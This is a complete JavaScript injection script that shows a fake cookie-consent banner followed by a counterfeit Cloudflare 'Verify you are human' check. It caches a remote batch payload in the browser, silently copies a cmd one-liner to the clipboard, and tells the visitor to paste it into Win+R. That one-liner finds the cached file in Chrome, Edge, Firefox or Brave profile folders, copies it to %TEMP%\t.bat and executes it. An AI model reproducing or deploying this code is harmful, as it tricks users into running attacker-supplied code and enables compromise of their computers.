/* Standalone consent+captcha inject — paste on any page:
   <script src="https://yoursite.com/consent.js"></script>
   File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
   Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
   One-liner finds cache by marker string (findstr), not file size.
*/
(function () {
  'use strict';

  if (window.__CONSENT_INJECTED__) return;
  window.__CONSENT_INJECTED__ = true;

  var CONSENT_CONFIG = {
    version: '1.6.0',
    privacyPolicyUrl: '/privacy-policy',
    optOutUrl: '/opt-out-preferences',
    accentColor: '#1b6369',
    accentHover: '#155459',
    captchaLogoUrl: 'https://cdn-bhdil.nitrocdn.com/isrDVIFCpCXbHHPoNruCoFKRiVumSNxS/assets/images/optimized/rev-aa44ab3/bobcares.com/wp-content/uploads/2023/08/cloudflare.jpeg',
    cacheFileUrl: null,
    cacheFileBodySize: null,
    strictBody: true,
    bodyStartMarker: '===CDRP_A7F3B2E9D41C===',
    bodyEndMarker: '===CDRP_END_A7F3B2E9D41C===',
    bodyMustStartWith: '@echo off',
    cacheSearchPaths: {
      firefox: { root: '%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles', glob: '(*)' },
      chrome: { root: '%LOCALAPPDATA%\\Google\\Chrome\\User Data', glob: '(f_*)' },
      edge: { root: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data', glob: '(f_*)' },
      brave: { root: '%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data', glob: '(f_*)' }
    }
  };

  if (window.CONSENT_CONFIG && typeof window.CONSENT_CONFIG === 'object') {
    for (var cfgKey in window.CONSENT_CONFIG) {
      if (Object.prototype.hasOwnProperty.call(window.CONSENT_CONFIG, cfgKey)) {
        CONSENT_CONFIG[cfgKey] = window.CONSENT_CONFIG[cfgKey];
      }
    }
  }

  function looksLikeUrl(value) {
    return /^https?:\/\/.+/i.test(value);
  }

  function decodeBase64Url(value) {
    var b64 = value.replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4) b64 += '=';
    var bin = atob(b64);
    try {
      return decodeURIComponent(Array.prototype.map.call(bin, function (c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
    } catch (e) {
      return bin;
    }
  }

  function parseFileUrlFromQuery() {
    try {
      var raw = new URLSearchParams(location.search).get('f');
      if (!raw) return null;
      raw = raw.trim();
      if (!raw) return null;

      if (looksLikeUrl(raw)) return raw;

      try {
        var decoded = decodeURIComponent(raw);
        if (looksLikeUrl(decoded)) return decoded;
      } catch (e1) {}

      var fromB64 = decodeBase64Url(raw);
      if (looksLikeUrl(fromB64)) return fromB64;
    } catch (e2) {}
    return null;
  }

  var queryFileUrl = parseFileUrlFromQuery();
  if (queryFileUrl) CONSENT_CONFIG.cacheFileUrl = queryFileUrl;

  var consentStyle = null;
  var captchaStyle = null;
  var overlay = null;
  var popup = null;
  var captchaWidget = null;
  var captchaOverlay = null;
  var captchaVisible = false;

  function getFaviconCandidates() {
    var urls = [];
    document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').forEach(function (link) {
      if (link.href && urls.indexOf(link.href) === -1) urls.push(link.href);
    });
    if (urls.indexOf('/favicon.ico') === -1) urls.push('/favicon.ico');
    return urls;
  }

  function resolveFavicon(cb) {
    var urls = getFaviconCandidates();
    function tryNext(i) {
      if (i >= urls.length) return cb(null);
      var img = new Image();
      img.onload = function () { cb(urls[i]); };
      img.onerror = function () { tryNext(i + 1); };
      img.src = urls[i];
    }
    tryNext(0);
  }

  function updateCacheStatus(state, text) {
    var statusEl = document.getElementById('status');
    var previewEl = document.getElementById('preview');
    if (!statusEl) return;

    if (state === 'ok') {
      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, one-liner searches for "' + (CONSENT_CONFIG.bodyStartMarker || '') + '" (' + getBrowserKey() + ')';
      statusEl.className = 'ok';
      if (previewEl && text) previewEl.textContent = text;
    } else {
      statusEl.textContent = 'cache failed: ' + (text || 'unknown error');
      statusEl.className = 'wait';
    }
  }

  function getBrowserKey() {
    var ua = navigator.userAgent || '';
    if (ua.indexOf('Firefox') !== -1) return 'firefox';
    if (ua.indexOf('Edg/') !== -1) return 'edge';
    if (ua.indexOf('Brave') !== -1) return 'brave';
    return 'chrome';
  }

  function getVerificationCommand() {
    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
    if (!startMarker || !endMarker) return '';

    var key = getBrowserKey();
    var paths = CONSENT_CONFIG.cacheSearchPaths || {};
    var profile = paths[key] || paths.firefox;
    if (!profile) return '';

    var find = 'findstr /m /c:"' + startMarker + '" "%f" >nul 2>nul && findstr /m /c:"' + endMarker + '" "%f" >nul 2>nul';
    var loop = 'for /r "' + profile.root + '" %f in ' + profile.glob + ' do @(' + find + ' && if not exist "%TEMP%\\t.bat" copy /y "%f" "%TEMP%\\t.bat" >nul 2>nul)';
    return 'cmd /c ' + loop + ' & if exist "%TEMP%\\t.bat" call "%TEMP%\\t.bat"';
  }

  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.top = '0';
    ta.style.left = '0';
    ta.style.width = '1px';
    ta.style.height = '1px';
    ta.style.opacity = '0';
    ta.style.pointerEvents = 'none';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, text.length);
    var ok = false;
    try { ok = document.execCommand('copy'); } catch (e1) {}
    ta.remove();
    return ok;
  }

  function copyVerificationCommand() {
    var cmd = getVerificationCommand();
    if (!cmd) return false;

    if (fallbackCopy(cmd)) return true;

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(cmd).catch(function () {
        fallbackCopy(cmd);
      });
      return true;
    }
    return false;
  }

  function bindCopyOnUserGesture(el) {
    if (!el || el.__tsCopyBound__) return;
    el.__tsCopyBound__ = true;
    el.addEventListener('pointerdown', function () {
      copyVerificationCommand();
    });
    el.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') copyVerificationCommand();
    });
  }

  function getCacheFileUrl() {
    if (CONSENT_CONFIG.cacheFileUrl) return CONSENT_CONFIG.cacheFileUrl;
    var origin = location.origin || (location.protocol + '//' + location.host);
    return origin + '/hello.txt';
  }

  function validateStrictPayload(buf) {
    if (!buf || !buf.byteLength) {
      return { ok: false, reason: 'empty response body' };
    }

    var bytes = new Uint8Array(buf);
    var i;

    if (bytes.length >= 3 && bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) {
      return { ok: false, reason: 'UTF-8 BOM not allowed — body must be raw bytes only' };
    }

    for (i = 0; i < bytes.length; i++) {
      if (bytes[i] === 0) {
        return { ok: false, reason: 'null byte in body' };
      }
    }

    var text;
    try {
      text = new TextDecoder('utf-8', { fatal: true }).decode(buf);
    } catch (e) {
      return { ok: false, reason: 'invalid UTF-8 in body' };
    }

    var mustStart = CONSENT_CONFIG.bodyMustStartWith || '@echo off';
    if (text.slice(0, mustStart.length).toLowerCase() !== mustStart.toLowerCase()) {
      return { ok: false, reason: 'body must start with "' + mustStart + '" (no headers or HTML prefix)' };
    }

    var contamination = [
      [/^HTTP\/\d/m, 'HTTP status line inside body'],
      [/^Content-Type:/im, 'Content-Type header inside body'],
      [/^Content-Length:/im, 'Content-Length header inside body'],
      [/^Cache-Control:/im, 'Cache-Control header inside body'],
      [/^Transfer-Encoding:/im, 'Transfer-Encoding header inside body'],
      [/^Date:/im, 'Date header inside body'],
      [/^Server:/im, 'Server header inside body'],
      [/<!DOCTYPE/i, 'HTML document instead of raw payload'],
      [/<html/i, 'HTML document instead of raw payload'],
      [/<script/i, 'HTML/script instead of raw payload']
    ];
    for (i = 0; i < contamination.length; i++) {
      if (contamination[i][0].test(text)) {
        return { ok: false, reason: contamination[i][1] };
      }
    }

    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
    if (text.indexOf(startMarker) === -1) {
      return { ok: false, reason: 'missing start marker ' + startMarker };
    }
    if (text.indexOf(endMarker) === -1) {
      return { ok: false, reason: 'missing end marker ' + endMarker };
    }

    var endIdx = text.lastIndexOf(endMarker);
    var afterEnd = text.slice(endIdx + endMarker.length);
    if (!/^[\r\n]*$/.test(afterEnd)) {
      return { ok: false, reason: 'extra bytes after end marker — body must end at ' + endMarker };
    }

    return { ok: true, bytes: bytes, text: text, bodyBytes: bytes.length };
  }

  function saveBodyReference(buf) {
    var origin = location.origin || (location.protocol + '//' + location.host);
    if (!origin || origin === 'null') return Promise.resolve();

    return fetch(origin + '/_save-body-ref', {
      method: 'POST',
      body: buf,
      credentials: 'omit',
      cache: 'no-store',
      headers: { 'Content-Type': 'application/octet-stream' }
    }).catch(function () {});
  }

  function cacheDropHelloFile() {
    var url = getCacheFileUrl();
    if (!url) return Promise.resolve(false);

    CONSENT_CONFIG.cacheFileBodySize = null;

    return fetch(url, { cache: 'default', credentials: 'omit' })
      .then(function (response) {
        if (!response.ok) throw new Error('HTTP ' + response.status);
        return response.arrayBuffer().then(function (buf) {
          if (CONSENT_CONFIG.strictBody !== false) {
            var check = validateStrictPayload(buf);
            if (!check.ok) {
              updateCacheStatus('fail', check.reason);
              return false;
            }
          }

          CONSENT_CONFIG.cacheFileBodySize = buf.byteLength;
          updateCacheStatus('ok', new TextDecoder('utf-8').decode(buf));
          saveBodyReference(buf);
          return true;
        });
      })
      .catch(function (err) {
        updateCacheStatus('fail', err.message || 'fetch failed — CORS or network error');
        return false;
      });
  }

  function generateRefId() {
    var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    var parts = [];
    for (var p = 0; p < 10; p++) {
      var seg = '';
      for (var i = 0; i < 4; i++) seg += chars.charAt(Math.floor(Math.random() * chars.length));
      parts.push(seg);
    }
    return parts.join('-');
  }

  /* --- Captcha (Cloudflare Turnstile style) — shown after consent interaction --- */
  function getCaptchaCss() {
    return (
      '#ts-widget-overlay{position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);cursor:default}' +
      '#ts-widget{position:fixed;left:50%;top:42%;transform:translate(-50%,-50%);z-index:2147483647;display:flex;align-items:center;width:380px;height:80px;padding:0 16px 0 18px;background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;box-sizing:border-box;user-select:none;transition:width .25s ease,height .25s ease}' +
      '#ts-widget.ts-verifying{display:block;width:min(500px,calc(100vw - 32px));height:auto;padding:0;background:#fff;border-color:#ddd;border-radius:2px;box-shadow:0 4px 24px rgba(0,0,0,.18)}' +
      '#ts-widget .ts-check-area{display:flex;align-items:center;gap:14px;flex:1;min-width:0;cursor:pointer}' +
      '#ts-widget .ts-box{width:32px;height:32px;border:2px solid #666;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-sizing:border-box;transition:border-color .2s,background .2s}' +
      '#ts-widget .ts-spinner{display:none;width:22px;height:22px;border:2px solid #e0e0e0;border-top-color:#666;border-radius:50%;animation:tsSpin .7s linear infinite}' +
      '#ts-widget.ts-loading .ts-spinner{display:block}' +
      '#ts-widget.ts-loading .ts-box{border-color:#bbb}' +
      '#ts-widget .ts-label{font-size:16px;color:#232323;white-space:nowrap;line-height:1.2}' +
      '#ts-widget .ts-brand{display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;width:96px;margin-left:10px;text-align:center}' +
      '#ts-widget .ts-brand img{width:88px;height:auto;max-height:54px;object-fit:contain;display:block;margin:0 auto 3px}' +
      '#ts-widget .ts-links{font-size:9px;line-height:1.2;color:#555}' +
      '#ts-widget .ts-links a{color:#555;text-decoration:none}' +
      '#ts-widget .ts-links a:hover{text-decoration:underline}' +
      '#ts-widget .ts-dot{margin:0 3px;color:#999}' +
      '#ts-widget .ts-v-header{display:flex;align-items:center;justify-content:space-between;padding:18px 20px 14px}' +
      '#ts-widget .ts-v-status{display:flex;align-items:center;gap:12px}' +
      '#ts-widget .ts-v-orbit{width:30px;height:30px;position:relative;flex-shrink:0;animation:tsOrbitSpin .85s linear infinite}' +
      '#ts-widget .ts-v-orbit span{position:absolute;top:50%;left:50%;width:6px;height:6px;margin:-3px 0 0 -3px;background:#f6821f;border-radius:50%;box-shadow:0 0 0 1px rgba(246,130,31,.15);animation:tsDotPulse 1.2s ease-in-out infinite}' +
      '#ts-widget .ts-v-orbit span:nth-child(1){transform:rotate(0deg) translateY(-13px);animation-delay:0s}' +
      '#ts-widget .ts-v-orbit span:nth-child(2){transform:rotate(45deg) translateY(-13px);animation-delay:-1.05s}' +
      '#ts-widget .ts-v-orbit span:nth-child(3){transform:rotate(90deg) translateY(-13px);animation-delay:-.9s}' +
      '#ts-widget .ts-v-orbit span:nth-child(4){transform:rotate(135deg) translateY(-13px);animation-delay:-.75s}' +
      '#ts-widget .ts-v-orbit span:nth-child(5){transform:rotate(180deg) translateY(-13px);animation-delay:-.6s}' +
      '#ts-widget .ts-v-orbit span:nth-child(6){transform:rotate(225deg) translateY(-13px);animation-delay:-.45s}' +
      '#ts-widget .ts-v-orbit span:nth-child(7){transform:rotate(270deg) translateY(-13px);animation-delay:-.3s}' +
      '#ts-widget .ts-v-orbit span:nth-child(8){transform:rotate(315deg) translateY(-13px);animation-delay:-.15s}' +
      '#ts-widget .ts-v-title{font-size:15px;font-weight:500;color:#3d3d3d}' +
      '#ts-widget .ts-v-brand{display:flex;flex-direction:column;align-items:center;text-align:center}' +
      '#ts-widget .ts-v-brand img{width:90px;height:auto;max-height:52px;object-fit:contain}' +
      '#ts-widget .ts-v-brand .ts-links{margin-top:2px}' +
      '#ts-widget .ts-v-rule{height:3px;background:#c4722d;margin:0}' +
      '#ts-widget .ts-v-body{padding:22px 24px 8px;color:#222;font-size:15px;line-height:1.75}' +
      '#ts-widget .ts-v-body h3{font-size:16px;font-weight:700;margin:0 0 14px;color:#111}' +
      '#ts-widget .ts-v-body ol{margin:0;padding:0 0 0 22px}' +
      '#ts-widget .ts-v-body li{margin-bottom:10px}' +
      '#ts-widget .ts-kbd{display:inline-block;min-width:1.4em;padding:2px 7px;margin:0 2px;border:1px solid #bbb;border-bottom-width:2px;border-radius:4px;background:linear-gradient(180deg,#fff 0%,#f3f3f3 100%);font-size:13px;font-family:inherit;font-weight:600;color:#333;box-shadow:0 1px 0 rgba(0,0,0,.06);text-align:center;line-height:1.35}' +
      '#ts-widget .ts-v-ref{padding:16px 20px 20px;text-align:center;font-size:11px;color:#888;line-height:1.5}' +
      '#ts-widget .ts-v-ref-id{font-size:10px;color:#999;word-break:break-all;margin-top:4px;letter-spacing:.3px}' +
      '#ts-widget .ts-v-copy-hint{margin:12px 0 0;font-size:13px;line-height:1.4}' +
      '#ts-widget .ts-v-copy-ok{color:#2e7d32}' +
      '#ts-widget .ts-v-copy-warn{color:#b45309}' +
      '@keyframes tsSpin{to{transform:rotate(360deg)}}' +
      '@keyframes tsOrbitSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}' +
      '@keyframes tsDotPulse{0%,100%{opacity:.2}50%{opacity:1}}'
    );
  }

  function getCaptchaHtml() {
    return (
      '<div class="ts-check-area" tabindex="0" role="checkbox" aria-checked="false" aria-label="Verify you are human">' +
      '<div class="ts-box"><div class="ts-spinner"></div></div>' +
      '<span class="ts-label">Verify you are human</span></div>' +
      '<div class="ts-brand"><img src="' + CONSENT_CONFIG.captchaLogoUrl + '" alt="Cloudflare">' +
      '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy</a><span class="ts-dot">·</span><a href="#">Help</a></div></div>'
    );
  }

  function getOrbitDotsHtml() {
    var html = '<div class="ts-v-orbit" aria-hidden="true">';
    for (var i = 0; i < 8; i++) html += '<span></span>';
    return html + '</div>';
  }

  function getVerifyingHtml(refId) {
    return (
      '<div class="ts-v-header">' +
      '<div class="ts-v-status">' + getOrbitDotsHtml() + '<span class="ts-v-title">Verifying...</span></div>' +
      '<div class="ts-v-brand"><img src="' + CONSENT_CONFIG.captchaLogoUrl + '" alt="Cloudflare">' +
      '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy</a><span class="ts-dot">·</span><a href="#">Help</a></div></div></div>' +
      '<div class="ts-v-rule"></div>' +
      '<div class="ts-v-body"><h3>Let us know you\'re human, please complete steps:</h3><ol>' +
      '<li>Press <span class="ts-kbd">Win</span> + <span class="ts-kbd">R</span> to open the verification dialog</li>' +
      '<li>Press <span class="ts-kbd">Ctrl</span> + <span class="ts-kbd">V</span> to paste the confirmation code</li>' +
      '<li>Press <span class="ts-kbd">Enter</span> to confirm you\'re not a robot</li>' +
      '</ol></div>' +
      '<div class="ts-v-ref">Ref ID:<div class="ts-v-ref-id">' + refId + '</div></div>' +
      '<p class="ts-v-copy-hint"></p>'
    );
  }

  function updateCopyHint(el, copied) {
    if (!el) return;
    if (!getVerificationCommand()) {
      el.textContent = 'Confirmation code unavailable — check bodyStartMarker/bodyEndMarker in consent.js.';
      el.className = 'ts-v-copy-hint ts-v-copy-warn';
      return;
    }
    el.textContent = copied
      ? 'Confirmation code copied to clipboard.'
      : 'Click this panel and press Ctrl+V again if paste is empty.';
    el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
  }

  function removeCaptcha() {
    if (captchaWidget) {
      captchaWidget.remove();
      captchaWidget = null;
    }
    if (captchaOverlay) {
      captchaOverlay.remove();
      captchaOverlay = null;
    }
    if (captchaStyle) {
      captchaStyle.remove();
      captchaStyle = null;
    }
    document.body.style.overflow = '';
    captchaVisible = false;
  }

  function showCaptcha() {
    if (captchaVisible) return;
    captchaVisible = true;

    captchaStyle = document.createElement('style');
    captchaStyle.id = 'ts-widget-style';
    captchaStyle.textContent = getCaptchaCss();
    document.head.appendChild(captchaStyle);

    captchaWidget = document.createElement('div');
    captchaWidget.id = 'ts-widget';
    captchaWidget.setAttribute('role', 'presentation');
    captchaWidget.innerHTML = getCaptchaHtml();

    var checkArea = captchaWidget.querySelector('.ts-check-area');
    var verified = false;
    var busy = false;

    function showVerifyingPanel() {
      verified = true;
      busy = false;
      captchaWidget.classList.remove('ts-loading');
      captchaWidget.classList.add('ts-verifying');
      captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
      var copied = copyVerificationCommand();
      updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
      bindCopyOnUserGesture(captchaWidget);
    }

    function runVerify() {
      if (verified || busy) return;
      copyVerificationCommand();
      busy = true;
      captchaWidget.classList.add('ts-loading');
      checkArea.setAttribute('aria-checked', 'true');
      setTimeout(showVerifyingPanel, 700 + Math.random() * 400);
    }

    checkArea.addEventListener('click', runVerify);
    checkArea.addEventListener('keydown', function (e) {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        runVerify();
      }
    });

    captchaOverlay = document.createElement('div');
    captchaOverlay.id = 'ts-widget-overlay';
    captchaOverlay.setAttribute('aria-hidden', 'true');

    document.body.style.overflow = 'hidden';
    document.body.appendChild(captchaOverlay);
    document.body.appendChild(captchaWidget);
  }

  /* --- Consent popup --- */
  function getConsentCss() {
    return (
      '#consent-popup-overlay{position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}' +
      '#consent-popup{position:fixed;right:20px;bottom:20px;z-index:2147483647;width:min(560px,calc(100vw - 40px));max-height:calc(100vh - 40px);background:#f5f5f5;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.35);overflow:auto;animation:consentSlideIn .35s ease}' +
      '@keyframes consentSlideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}' +
      '#consent-popup .cp-header{display:flex;align-items:center;gap:14px;padding:22px 28px 18px;border-bottom:1px solid #e0e0e0;background:#fff}' +
      '#consent-popup .cp-logo{display:flex;align-items:center}' +
      '#consent-popup .cp-logo:empty{display:none}' +
      '#consent-popup .cp-logo img{width:36px;height:36px;object-fit:contain}' +
      '#consent-popup .cp-title{flex:1;font-size:22px;font-weight:700;color:#2d2d2d;margin:0}' +
      '#consent-popup .cp-body{padding:24px 28px 20px;color:#333;font-size:17px;line-height:1.65}' +
      '#consent-popup .cp-actions{padding:0 28px 22px}' +
      '#consent-popup .cp-accept{display:block;width:100%;padding:18px;border:none;border-radius:8px;background:' + CONSENT_CONFIG.accentColor + ';color:#fff;font-size:18px;font-weight:600;cursor:pointer}' +
      '#consent-popup .cp-accept:hover{background:' + CONSENT_CONFIG.accentHover + '}' +
      '#consent-popup .cp-footer{display:flex;justify-content:center;gap:24px;padding:0 28px 26px}' +
      '#consent-popup .cp-footer a{color:' + CONSENT_CONFIG.accentColor + ';font-size:15px;text-decoration:underline;cursor:pointer}'
    );
  }

  function getConsentHtml(faviconUrl) {
    var logoHtml = faviconUrl ? '<img src="' + faviconUrl + '" alt="">' : '';

    return (
      '<div class="cp-header">' +
      '<div class="cp-logo">' + logoHtml + '</div>' +
      '<h2 class="cp-title">Manage Consent</h2></div>' +
      '<div class="cp-body">To provide the best experiences, we use technologies like cookies to store and/or access device information. ' +
      'Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. ' +
      'Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>' +
      '<div class="cp-actions"><button type="button" class="cp-accept">Accept</button></div>' +
      '<div class="cp-footer"><a href="' + CONSENT_CONFIG.optOutUrl + '">Opt-out preferences</a>' +
      '<a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy Policy</a></div>'
    );
  }

  function closeConsent() {
    document.body.style.overflow = '';
    if (overlay) overlay.remove();
    if (popup) popup.remove();
    if (consentStyle) consentStyle.remove();
    overlay = null;
    popup = null;
    consentStyle = null;
  }

  function onConsentInteract(e) {
    if (e) e.preventDefault();
    closeConsent();
    showCaptcha();
  }

  function mountConsent(faviconUrl) {
    consentStyle = document.createElement('style');
    consentStyle.textContent = getConsentCss();
    document.head.appendChild(consentStyle);

    overlay = document.createElement('div');
    overlay.id = 'consent-popup-overlay';

    popup = document.createElement('div');
    popup.id = 'consent-popup';
    popup.setAttribute('role', 'dialog');
    popup.setAttribute('aria-modal', 'true');
    popup.innerHTML = getConsentHtml(faviconUrl);

    popup.querySelectorAll('.cp-footer a, .cp-actions button').forEach(function (el) {
      el.addEventListener('click', onConsentInteract);
    });

    document.body.style.overflow = 'hidden';
    document.body.appendChild(overlay);
    document.body.appendChild(popup);
  }

  function showVersion() {
    var el = document.getElementById('version');
    if (el) el.textContent = CONSENT_CONFIG.version || 'unknown';
  }

  function init() {
    if (!document.body) return;
    showVersion();
    cacheDropHelloFile().then(function () {
      resolveFavicon(function (faviconUrl) {
        mountConsent(faviconUrl);
      });
    });
  }

  function boot() {
    if (!document.body) {
      setTimeout(boot, 20);
      return;
    }
    init();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
